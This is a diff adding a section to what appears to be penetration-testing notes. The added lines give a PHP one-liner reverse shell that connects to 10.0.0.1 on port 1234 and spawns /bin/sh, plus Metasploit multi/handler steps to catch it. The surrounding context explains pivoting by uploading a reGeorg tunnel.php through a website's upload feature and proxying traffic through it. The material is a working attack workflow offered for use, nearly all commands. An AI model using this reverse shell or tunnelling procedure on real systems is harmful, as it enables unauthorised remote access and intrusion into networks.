@@ -262,6 +262,16 @@ Pivoting with ReGeorg
 Git clone to that repo
 https://github.com/sensepost/reGeorg/tree/master
 
+php reverse shell code execute in php_webshell and listen with meterpreter
+--------------------------------------------------------------------------
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+meterpeter> use multi/handler
+          > set payload php/reverse_php
+          > set LHOST
+          > run
+
 1.Need to have file uploading function in website.
 2.Upload tunnel.php file
 3.python reGeorgSocksProxy.py -p 9050 -u http://192.139.178.3/public/tunnel.php (file uplading path)
